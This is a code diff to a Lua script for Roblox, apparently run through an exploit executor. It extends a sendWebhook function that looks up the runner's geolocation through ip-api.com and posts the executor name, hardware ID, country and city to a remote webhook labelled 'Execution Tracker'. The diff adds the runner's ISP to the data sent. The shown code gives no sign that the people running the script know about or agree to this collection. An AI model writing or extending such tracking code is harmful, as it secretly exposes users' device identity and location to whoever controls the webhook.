@@ -40,6 +40,7 @@ local function sendWebhook()
 
    local country = "Unknown"
    local city = "Unknown"
+   local isp = "Unknown"
    local request = request or http_request or (syn and syn.request) or nil
    if request then
       local res = request({Url = "http://ip-api.com/json", Method = "GET"})
@@ -49,6 +50,7 @@ local function sendWebhook()
          if geo then
                if geo.country then country = geo.country end
                if geo.city then city = geo.city end
+               if geo.isp then isp = geo.isp end
          end
       end
    end
@@ -78,7 +80,8 @@ local function sendWebhook()
                {["name"] = "🛠 Executor", ["value"] = "`" .. executorName .. "`", ["inline"] = true},
                {["name"] = "🖥 HWID", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
                {["name"] = "🌍 Country", ["value"] = "`" .. country .. "`", ["inline"] = true},
-               {["name"] = "🏙 City", ["value"] = "`" .. city .. "`", ["inline"] = true}
+               {["name"] = "🏙 City", ["value"] = "`" .. city .. "`", ["inline"] = true},
+               {["name"] = "🌐 ISP", ["value"] = "`" .. isp .. "`", ["inline"] = true}
          },
          ["footer"] = {
                ["text"] = "Execution Tracker • Roblox"
